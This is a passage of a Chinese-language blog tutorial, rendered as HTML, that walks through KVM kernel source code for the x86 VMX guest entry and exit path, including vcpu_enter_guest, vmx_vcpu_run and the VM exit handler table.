kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_run *kvm_run)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">.....</span><br><span class=\"line\">\tr = vcpu_run(vcpu);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vcpu-run\"><a href=\"#vcpu-run\" class=\"headerlink\" title=\"vcpu_run\"></a>vcpu_run</h3><p>kvm&#x2F;x86.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm</span> *<span class=\"title\">kvm</span> =</span> vcpu-&gt;kvm;</span><br><span class=\"line\"></span><br><span class=\"line\">\tvcpu-&gt;srcu_idx = srcu_read_lock(&amp;kvm-&gt;srcu);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_vcpu_running(vcpu)) &#123;</span><br><span class=\"line\">\t\t\tr = vcpu_enter_guest(vcpu);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tr = vcpu_block(kvm, vcpu);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">................</span><br><span class=\"line\">\t\tkvm_check_async_pf_completion(vcpu);</span><br><span class=\"line\">........</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\tvcpu_run的函数的主体结构也是一个循环，首先调用kvm_vcpu_running判断当前CPU是否可运行</p>\n<p>​\t\t如果判断是可运行的，<strong>则会调用vcpu_enter_guest来进入虚拟机</strong></p>\n<h3 id=\"vcpu-enter-guest\"><a href=\"#vcpu-enter-guest\" class=\"headerlink\" title=\"vcpu_enter_guest\"></a>vcpu_enter_guest</h3><p>kvm&#x2F;x86.c</p>\n<p>​\t\t在最开始会对vcpu-&gt;requests上的请求进行处理，这些请求可能来自多个地方，比如在处理VM Exit时，KVM在运行时需要修改虚拟机状态时等，这些请求都在即将进入guest的时候进行处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> req_int_win =</span><br><span class=\"line\">\t\tdm_request_for_irq_injection(vcpu) &amp;&amp;</span><br><span class=\"line\">\t\tkvm_cpu_accept_dm_intr(vcpu);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">bool</span> req_immediate_exit = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vcpu-&gt;requests) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_check_request(KVM_REQ_MMU_RELOAD, vcpu))</span><br><span class=\"line\">\t\t\tkvm_mmu_unload(vcpu);</span><br><span class=\"line\">\t.............</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t接下来会处理虚拟终端相关请求，然后调用kvm_mmu_reload,与内存设置相关</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t<span class=\"keyword\">if</span> (kvm_check_request(KVM_REQ_EVENT, vcpu) || req_int_win) &#123;</span><br><span class=\"line\">\t\tkvm_apic_accept_events(vcpu);</span><br><span class=\"line\">............</span><br><span class=\"line\"></span><br><span class=\"line\">\tr = kvm_mmu_reload(vcpu);</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后设置禁止抢占，之后调用回调函数prepare_guest_switch,<strong>vmx对应的函数是vmx_save_host_state</strong>, 从名称就可以推测,是准备要进入guest了,此时需要保存host的状态.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">preempt_disable();</span><br><span class=\"line\"></span><br><span class=\"line\">kvm_x86_ops-&gt;prepare_guest_switch(vcpu);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"vmx-save-host-state-保存host的信息\"><a href=\"#vmx-save-host-state-保存host的信息\" class=\"headerlink\" title=\"vmx_save_host_state(保存host的信息)\"></a>vmx_save_host_state(保存host的信息)</h4><p>​\t\t能够看到这个函数里面有很多savesegment和vmcs_write的操作,用来保存host的状态信息。 </p>\n<h4 id=\"vmx-vcpu-run-进入guest模式\"><a href=\"#vmx-vcpu-run-进入guest模式\" class=\"headerlink\" title=\"vmx_vcpu_run(进入guest模式)\"></a>vmx_vcpu_run(进入guest模式)</h4><p>​\t\t紧接着的函数是vmx的run回调，对应的函数时vmx_vcpu_run</p>\n<p>x86.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kvm_x86_ops-&gt;run(vcpu);</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t该函数首先根据VCPU的状态写一些VMCS的值，<strong>然后执行汇编ASM_VMX_VMLAUNCH将CPU置于guest模式，<font color=\"red\">这个时候CPU就开始执行虚拟机的代码</font></strong></p>\n<p>vmx.c\t\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __noclone <span class=\"title function_\">vmx_vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ........</span><br><span class=\"line\">vmx-&gt;__launched = vmx-&gt;loaded_vmcs-&gt;launched;</span><br><span class=\"line\">\t<span class=\"keyword\">asm</span>(</span><br><span class=\"line\">\t\t<span class=\"comment\">/* Store host registers */</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;push %%&quot;</span> _ASM_DX <span class=\"string\">&quot;; push %%&quot;</span> _ASM_BP <span class=\"string\">&quot;;&quot;</span></span><br><span class=\"line\">.....</span><br><span class=\"line\">\t......</span><br><span class=\"line\">\t\t<span class=\"comment\">/* Enter guest mode */</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;jne 1f \\n\\t&quot;</span></span><br><span class=\"line\">\t\t__ex(ASM_VMX_VMLAUNCH) <span class=\"string\">&quot;\\n\\t&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;jmp 2f \\n\\t&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;1: &quot;</span> __ex(ASM_VMX_VMRESUME) <span class=\"string\">&quot;\\n\\t&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"guest进入host-回到宿主机进行处理\"><a href=\"#guest进入host-回到宿主机进行处理\" class=\"headerlink\" title=\"guest进入host | 回到宿主机进行处理\"></a>guest进入host | 回到宿主机进行处理</h1><img src=\"/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-2-KVM%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81-%E5%86%85%E6%A0%B84-4%E7%89%88%E6%9C%AC/image-20230802014945208.png\" alt=\"image-20230802014945208\" style=\"zoom:50%;\">\n\n<h3 id=\"VM-exit-退出\"><a href=\"#VM-exit-退出\" class=\"headerlink\" title=\"VM exit 退出\"></a>VM exit 退出</h3><p>​\t\t在kvm的vmx_vcpu_run函数里面执行了ASM_VMX_VMLAUNCH,将CPU置于guest模式,开始运行虚拟机的代码,<font color=\"red\">当后面遇到敏感指令的时候,CPU产生VMExit,此时KVM接管CPU,就会跳到下一行代码,jmp 2f,也就是跳到标号2的地方,看注释很明显,保存guest的寄存器,恢复host的,要进行切换( 不过目前也不完全是这样,</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __noclone <span class=\"title function_\">vmx_vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ........</span><br><span class=\"line\">vmx-&gt;__launched = vmx-&gt;loaded_vmcs-&gt;launched;</span><br><span class=\"line\">\t<span class=\"keyword\">asm</span>(</span><br><span class=\"line\">\t\t<span class=\"comment\">/* Store host registers */</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;push %%&quot;</span> _ASM_DX <span class=\"string\">&quot;; push %%&quot;</span> _ASM_BP <span class=\"string\">&quot;;&quot;</span></span><br><span class=\"line\">.....</span><br><span class=\"line\">\t......</span><br><span class=\"line\"><span class=\"comment\">/* Enter guest mode */</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;jne 1f \\n\\t&quot;</span></span><br><span class=\"line\">\t\t__ex(ASM_VMX_VMLAUNCH) <span class=\"string\">&quot;\\n\\t&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;jmp 2f \\n\\t&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;1: &quot;</span> __ex(ASM_VMX_VMRESUME) <span class=\"string\">&quot;\\n\\t&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;2: &quot;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">/* Save guest registers, load host registers, keep flags */</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %0, %c[wordsize](%%&quot;</span> _ASM_SP <span class=\"string\">&quot;) \\n\\t&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pop %0 \\n\\t&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;setbe %c[fail](%0)\\n\\t&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t调用vmcs_read32读取虚拟机退出的原因，保存在vcpu_vmx结构体的exit_reason成员中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __noclone <span class=\"title function_\">vmx_vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ........</span><br><span class=\"line\">vmx-&gt;exit_reason = vmcs_read32(VM_EXIT_REASON);</span><br><span class=\"line\">    ....</span><br><span class=\"line\">    vmx_complete_atomic_exit(vmx);</span><br><span class=\"line\">\tvmx_recover_nmi_blocking(vmx);</span><br><span class=\"line\">\tvmx_complete_interrupts(vmx);</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t最后调用3个函数对本次退出进行预处理</p>\n<h3 id=\"回到vcpu-enter-guest进行退出的详细处理\"><a href=\"#回到vcpu-enter-guest进行退出的详细处理\" class=\"headerlink\" title=\"回到vcpu_enter_guest进行退出的详细处理\"></a>回到vcpu_enter_guest进行退出的详细处理</h3><p>​\t\t当vmx_vcpu_run运行结束,回到vcpu_enter_guest函数,</p>\n<p>x86.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ....</span><br><span class=\"line\">\tkvm_x86_ops-&gt;run(vcpu); <span class=\"comment\">//vmx_vcpu_run</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\">\t<span class=\"comment\">/* Interrupt is enabled by handle_external_intr() */</span></span><br><span class=\"line\">\tkvm_x86_ops-&gt;handle_external_intr(vcpu);</span><br><span class=\"line\">    ....</span><br><span class=\"line\">    r = kvm_x86_ops-&gt;handle_exit(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t虚拟机退出之后会调用vmx实现的handle_external_intr回调来处理外部中断，并调用handle_exit回调来处理各种退出事件</p>\n<h3 id=\"vmx-handle-external-intr\"><a href=\"#vmx-handle-external-intr\" class=\"headerlink\" title=\"vmx_handle_external_intr\"></a>vmx_handle_external_intr</h3><p>​\t\thandle_external_intr 对应vmx_handle_external_intr</p>\n<p>​\t\t读取中断信息，判断是否是有效的中断，如果是，读取中断号vector，然后得到宿主机中对应IDT的中断门描述符，最后一段汇编用来执行处理函数，vmx_handle_external_intr会开启中断</p>\n<p>​\t\t<strong>也就是说，CPU在guest模式运行时，中断是关闭的，运行着虚拟机代码的CPU不会接收到外部中断，但是外部中断会导致CPU退出guest模式，进入VMX root模式</strong></p>\n<p>vmx.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">vmx_handle_external_intr</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tu32 exit_intr_info = vmcs_read32(VM_EXIT_INTR_INFO);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * If external interrupt exists, IF bit is set in rflags/eflags on the</span></span><br><span class=\"line\"><span class=\"comment\">\t * interrupt stack frame, and interrupt will be enabled on a return</span></span><br><span class=\"line\"><span class=\"comment\">\t * from interrupt handler.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((exit_intr_info &amp; (INTR_INFO_VALID_MASK | INTR_INFO_INTR_TYPE_MASK))</span><br><span class=\"line\">\t\t\t== (INTR_INFO_VALID_MASK | INTR_TYPE_EXT_INTR)) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"built_in\">vector</span>;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> entry;</span><br><span class=\"line\">\t\tgate_desc *desc;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vcpu_vmx</span> *<span class=\"title\">vmx</span> =</span> to_vmx(vcpu);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_X86_64</span></span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> tmp;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"built_in\">vector</span> =  exit_intr_info &amp; INTR_INFO_VECTOR_MASK;</span><br><span class=\"line\">\t\tdesc = (gate_desc *)vmx-&gt;host_idt_base + <span class=\"built_in\">vector</span>;</span><br><span class=\"line\">\t\tentry = gate_offset(*desc);</span><br><span class=\"line\">\t\t<span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">#ifdef CONFIG_X86_64</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"string\">&quot;mov %%&quot;</span> _ASM_SP <span class=\"string\">&quot;, %[sp]\\n\\t&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"string\">&quot;and $0xfffffffffffffff0, %%&quot;</span> _ASM_SP <span class=\"string\">&quot;\\n\\t&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"string\">&quot;push $%c[ss]\\n\\t&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"string\">&quot;push %[sp]\\n\\t&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">#endif</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"string\">&quot;pushf\\n\\t&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t<span class=\"string\">&quot;orl $0x200, (%%&quot;</span> _ASM_SP <span class=\"string\">&quot;)\\n\\t&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t__ASM_SIZE(push) <span class=\"string\">&quot; $%c[cs]\\n\\t&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\tCALL_NOSPEC</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t:</span></span><br><span class=\"line\"><span class=\"params\">#ifdef CONFIG_X86_64</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t[sp]<span class=\"string\">&quot;=&amp;r&quot;</span>(tmp)</span></span><br><span class=\"line\"><span class=\"params\">#endif</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t:</span></span><br><span class=\"line\"><span class=\"params\">\t\t\tTHUNK_TARGET(entry),</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t[ss]<span class=\"string\">&quot;i&quot;</span>(__KERNEL_DS),</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t[cs]<span class=\"string\">&quot;i&quot;</span>(__KERNEL_CS)</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t)</span>;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tlocal_irq_enable();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t如果不是呢？？？？调用local_irq_enable();</p>\n<p>​\t\t</p>\n<h3 id=\"vm-handle-exit\"><a href=\"#vm-handle-exit\" class=\"headerlink\" title=\"vm_handle_exit\"></a>vm_handle_exit</h3><p>​\t\t执行完vmx_handle_external_intr后继续执行vcpu_enter_guest(x86.c)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ....</span><br><span class=\"line\">\tkvm_x86_ops-&gt;run(vcpu); <span class=\"comment\">//vmx_vcpu_run</span></span><br><span class=\"line\">    ....</span><br><span class=\"line\">\t<span class=\"comment\">/* Interrupt is enabled by handle_external_intr() */</span></span><br><span class=\"line\">\tkvm_x86_ops-&gt;handle_external_intr(vcpu);</span><br><span class=\"line\">    ....</span><br><span class=\"line\">    r = kvm_x86_ops-&gt;handle_exit(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t从上面可知，外部中断的处理时在handle_exit之前进行的，所以在后面handle_exit中处理外部中断的时候就没什么太多要做的了。</p>\n<p>​\t\thandle_exit 对应 vmx_handle_exit 函数，它是退出事件总的分发处理函数，<strong>在对一些特殊情况进行判断之后根据突出原因调用了kvm_vmx_exit_handlers中定义的相应的分发函数</strong></p>\n<p>​\tvmx.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vmx_handle_exit</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vcpu_vmx</span> *<span class=\"title\">vmx</span> =</span> to_vmx(vcpu);</span><br><span class=\"line\">\tu32 exit_reason = vmx-&gt;exit_reason;</span><br><span class=\"line\">\tu32 vectoring_info = vmx-&gt;idt_vectoring_info;</span><br><span class=\"line\">...................</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (exit_reason &lt; kvm_vmx_max_exit_handlers</span><br><span class=\"line\">\t    &amp;&amp; kvm_vmx_exit_handlers[exit_reason])</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_vmx_exit_handlers[exit_reason](vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tWARN_ONCE(<span class=\"number\">1</span>, <span class=\"string\">&quot;vmx: unexpected exit reason 0x%x\\n&quot;</span>, exit_reason);</span><br><span class=\"line\">\t\tkvm_queue_exception(vcpu, UD_VECTOR);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以看到一个关键的地方, 传入退出的原因，然后进行选择处理函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;&amp; kvm_vmx_exit_handlers[exit_reason])</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_vmx_exit_handlers[exit_reason](vcpu);</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tkvm_vmx_exit_handlers中的EXIT_REASON_XXXX宏定义了退出的原因，对应的handle_xxx则定义了相应的处理函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"title function_\">int</span> <span class=\"params\">(*<span class=\"type\">const</span> kvm_vmx_exit_handlers[])</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span> = &#123;</span><br><span class=\"line\">\t[EXIT_REASON_EXCEPTION_NMI]           = handle_exception,</span><br><span class=\"line\">\t[EXIT_REASON_EXTERNAL_INTERRUPT]      = handle_external_interrupt,</span><br><span class=\"line\">\t[EXIT_REASON_TRIPLE_FAULT]            = handle_triple_fault,</span><br><span class=\"line\">\t[EXIT_REASON_NMI_WINDOW]\t      = handle_nmi_window,</span><br><span class=\"line\">\t[EXIT_REASON_IO_INSTRUCTION]          = handle_io,</span><br><span class=\"line\">\t[EXIT_REASON_CR_ACCESS]               = handle_cr,</span><br><span class=\"line\">\t[EXIT_REASON_DR_ACCESS]               = handle_dr,</span><br><span class=\"line\">\t[EXIT_REASON_CPUID]                   = handle_cpuid,</span><br><span class=\"line\">\t[EXIT_REASON_MSR_READ]                = handle_rdmsr,</span><br><span class=\"line\">\t[EXIT_REASON_MSR_WRITE]               = handle_wrmsr,</span><br><span class=\"line\">\t[EXIT_REASON_PENDING_INTERRUPT]       = handle_interrupt_window,</span><br><span class=\"line\">\t[EXIT_REASON_HLT]                     = handle_halt,</span><br><span class=\"line\">\t[EXIT_REASON_INVD]\t\t      = handle_invd,</span><br><span 